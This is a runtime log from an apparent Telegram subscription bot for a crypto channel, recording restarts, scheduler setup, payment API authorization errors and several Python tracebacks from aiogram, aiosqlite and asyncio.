2026-05-12 21:21:09 | INFO     | __main__ | Запуск бота...
2026-05-12 21:21:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:21:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:21:09 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 21:21:09 | INFO     | __main__ | Запуск polling...
2026-05-12 21:21:19 | INFO     | __main__ | Завершение работы бота...
2026-05-12 21:21:19 | ERROR    | asyncio | unhandled exception during asyncio.run() shutdown
task: <Task finished name='Task-1' coro=<main() done, defined at C:\Users\Nikta\Desktop\bot\main.py:94> exception=AttributeError("'NoneType' object has no attribute 'call_soon_threadsafe'")>
Traceback (most recent call last):
  File "C:\python310\lib\asyncio\runners.py", line 44, in run
    return loop.run_until_complete(main)
  File "C:\python310\lib\asyncio\base_events.py", line 633, in run_until_complete
    self.run_forever()
  File "C:\python310\lib\asyncio\windows_events.py", line 321, in run_forever
    super().run_forever()
  File "C:\python310\lib\asyncio\base_events.py", line 600, in run_forever
    self._run_once()
  File "C:\python310\lib\asyncio\base_events.py", line 1860, in _run_once
    event_list = self._selector.select(timeout)
  File "C:\python310\lib\asyncio\windows_events.py", line 439, in select
    self._poll(timeout)
  File "C:\python310\lib\asyncio\windows_events.py", line 788, in _poll
    status = _overlapped.GetQueuedCompletionStatus(self._iocp, ms)
KeyboardInterrupt

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\Nikta\Desktop\bot\main.py", line 131, in main
    await dp.start_polling(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 543, in start_polling
    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
  File "C:\python310\lib\asyncio\tasks.py", line 384, in wait
    return await _wait(fs, timeout, return_when, loop)
  File "C:\python310\lib\asyncio\tasks.py", line 491, in _wait
    await waiter
asyncio.exceptions.CancelledError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\Nikta\Desktop\bot\main.py", line 139, in main
    await on_shutdown(bot, scheduler)
  File "C:\Users\Nikta\Desktop\bot\main.py", line 88, in on_shutdown
    scheduler.shutdown(wait=False)
  File "C:\python310\lib\site-packages\apscheduler\schedulers\asyncio.py", line 13, in wrapper
    self._eventloop.call_soon_threadsafe(wrapped)
AttributeError: 'NoneType' object has no attribute 'call_soon_threadsafe'
2026-05-12 21:21:50 | INFO     | __main__ | Запуск бота...
2026-05-12 21:21:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:21:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:21:50 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 21:21:50 | INFO     | __main__ | Запуск polling...
2026-05-12 21:22:12 | ERROR    | aiogram.event | Cause exception while process update id=676578376 by bot id=7203775205
OperationalError: no such table: users
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 55, in cmd_start
    await upsert_user(
  File "C:\Users\Nikta\Desktop\bot\database\db.py", line 55, in upsert_user
    await db.execute("""
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 193, in execute
    cursor = await self._execute(self._conn.execute, sql, parameters)
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 132, in _execute
    return await future
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 115, in run
    result = function()
sqlite3.OperationalError: no such table: users
2026-05-12 21:23:28 | INFO     | __main__ | Запуск бота...
2026-05-12 21:23:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:23:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:23:28 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 21:23:28 | INFO     | __main__ | Запуск polling...
2026-05-12 21:23:28 | INFO     | database.db | База данных инициализирована
2026-05-12 21:23:28 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 21:23:28 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 21:23:28 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 21:23:30 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 21:23:30 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 21:23:34 | ERROR    | aiogram.event | Cause exception while process update id=676578377 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: IMAGE_PROCESS_FAILED
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 68, in cmd_start
    await send_welcome(bot, user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 34, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: IMAGE_PROCESS_FAILED
2026-05-12 21:24:44 | INFO     | __main__ | Запуск бота...
2026-05-12 21:24:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:24:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 21:24:44 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 21:24:44 | INFO     | __main__ | Запуск polling...
2026-05-12 21:24:44 | INFO     | database.db | База данных инициализирована
2026-05-12 21:24:44 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 21:24:44 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 21:24:44 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 21:24:45 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 21:24:45 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 21:25:02 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 21:25:56 | ERROR    | payments.cryptobot | CryptoBot API error: {'ok': False, 'error': {'code': 401, 'name': 'UNAUTHORIZED'}}
2026-05-12 21:26:07 | ERROR    | payments.lava | Lava API error: {'status': 'error', 'message': 'Invalid token', 'code': 5, 't': 'Empty $jwt'}
2026-05-12 21:26:56 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 21:27:04 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 21:27:12 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 21:28:06 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 23:33:48 | INFO     | __main__ | Запуск бота...
2026-05-12 23:33:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:33:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:33:48 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 23:33:48 | INFO     | __main__ | Запуск polling...
2026-05-12 23:33:48 | INFO     | database.db | База данных инициализирована
2026-05-12 23:33:48 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 23:33:48 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 23:33:48 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 23:33:48 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-12 23:33:50 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-12 23:33:50 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-12 23:33:50 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 23:33:50 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 23:33:54 | ERROR    | aiogram.event | Cause exception while process update id=676578421 by bot id=7203775205
TypeError: unhashable type: 'DeleteMessage'
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 74, in cmd_start
    await asyncio.gather(
  File "C:\python310\lib\asyncio\tasks.py", line 782, in gather
    if arg not in arg_to_fut:
TypeError: unhashable type: 'DeleteMessage'
2026-05-12 23:33:59 | ERROR    | aiogram.event | Cause exception while process update id=676578422 by bot id=7203775205
TypeError: unhashable type: 'DeleteMessage'
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 74, in cmd_start
    await asyncio.gather(
  File "C:\python310\lib\asyncio\tasks.py", line 782, in gather
    if arg not in arg_to_fut:
TypeError: unhashable type: 'DeleteMessage'
2026-05-12 23:34:23 | INFO     | __main__ | Запуск бота...
2026-05-12 23:34:23 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:34:23 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:34:23 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 23:34:23 | INFO     | __main__ | Запуск polling...
2026-05-12 23:34:23 | INFO     | database.db | База данных инициализирована
2026-05-12 23:34:23 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 23:34:23 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 23:34:23 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 23:34:23 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-12 23:34:24 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-12 23:34:24 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-12 23:34:24 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 23:34:24 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 23:34:32 | ERROR    | aiogram.event | Cause exception while process update id=676578423 by bot id=7203775205
TypeError: unhashable type: 'DeleteMessage'
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 74, in cmd_start
    await asyncio.gather(
  File "C:\python310\lib\asyncio\tasks.py", line 782, in gather
    if arg not in arg_to_fut:
TypeError: unhashable type: 'DeleteMessage'
2026-05-12 23:34:43 | INFO     | __main__ | Завершение работы бота...
2026-05-12 23:34:43 | INFO     | apscheduler.scheduler | Scheduler has been shut down
2026-05-12 23:34:43 | INFO     | __main__ | Бот остановлен
2026-05-12 23:34:43 | INFO     | __main__ | Завершение работы бота...
2026-05-12 23:34:43 | INFO     | __main__ | Бот остановлен
2026-05-12 23:34:43 | ERROR    | asyncio | Exception in callback AsyncIOScheduler.shutdown(<apscheduler....001AABD286B60>, wait=False)() at C:\python310\lib\site-packages\apscheduler\schedulers\asyncio.py:39
handle: <Handle AsyncIOScheduler.shutdown(<apscheduler....001AABD286B60>, wait=False)() at C:\python310\lib\site-packages\apscheduler\schedulers\asyncio.py:39>
Traceback (most recent call last):
  File "C:\python310\lib\asyncio\runners.py", line 44, in run
    return loop.run_until_complete(main)
  File "C:\python310\lib\asyncio\base_events.py", line 633, in run_until_complete
    self.run_forever()
  File "C:\python310\lib\asyncio\windows_events.py", line 321, in run_forever
    super().run_forever()
  File "C:\python310\lib\asyncio\base_events.py", line 600, in run_forever
    self._run_once()
  File "C:\python310\lib\asyncio\base_events.py", line 1860, in _run_once
    event_list = self._selector.select(timeout)
  File "C:\python310\lib\asyncio\windows_events.py", line 439, in select
    self._poll(timeout)
  File "C:\python310\lib\asyncio\windows_events.py", line 788, in _poll
    status = _overlapped.GetQueuedCompletionStatus(self._iocp, ms)
KeyboardInterrupt

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\python310\lib\asyncio\events.py", line 80, in _run
    self._context.run(self._callback, *self._args)
  File "C:\python310\lib\site-packages\apscheduler\schedulers\asyncio.py", line 41, in shutdown
    super(AsyncIOScheduler, self).shutdown(wait)
  File "C:\python310\lib\site-packages\apscheduler\schedulers\base.py", line 199, in shutdown
    raise SchedulerNotRunningError
apscheduler.schedulers.SchedulerNotRunningError: Scheduler is not running
2026-05-12 23:35:02 | INFO     | __main__ | Запуск бота...
2026-05-12 23:35:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:35:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:35:02 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 23:35:02 | INFO     | __main__ | Запуск polling...
2026-05-12 23:35:02 | INFO     | database.db | База данных инициализирована
2026-05-12 23:35:02 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 23:35:02 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 23:35:02 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 23:35:02 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-12 23:35:03 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-12 23:35:03 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-12 23:35:03 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 23:35:03 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 23:35:20 | ERROR    | aiogram.event | Cause exception while process update id=676578425 by bot id=7203775205
TypeError: unhashable type: 'DeleteMessage'
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 74, in cmd_start
    await asyncio.gather(
  File "C:\python310\lib\asyncio\tasks.py", line 782, in gather
    if arg not in arg_to_fut:
TypeError: unhashable type: 'DeleteMessage'
2026-05-12 23:37:12 | INFO     | __main__ | Запуск бота...
2026-05-12 23:37:12 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:37:12 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-12 23:37:12 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-12 23:37:12 | INFO     | __main__ | Запуск polling...
2026-05-12 23:37:12 | INFO     | database.db | База данных инициализирована
2026-05-12 23:37:12 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-12 23:37:12 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-12 23:37:12 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-12 23:37:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-12 23:37:13 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-12 23:37:13 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-12 23:37:13 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-12 23:37:13 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-12 23:37:19 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-12 23:37:27 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-12 23:37:47 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-12 23:37:49 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-12 23:37:50 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-12 23:37:53 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 20:54:43 | INFO     | __main__ | Запуск бота...
2026-05-13 20:54:43 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:54:43 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:54:43 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 20:54:43 | INFO     | __main__ | Запуск polling...
2026-05-13 20:54:43 | INFO     | database.db | База данных инициализирована
2026-05-13 20:54:43 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 20:54:43 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 20:54:43 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 20:54:43 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 20:54:47 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
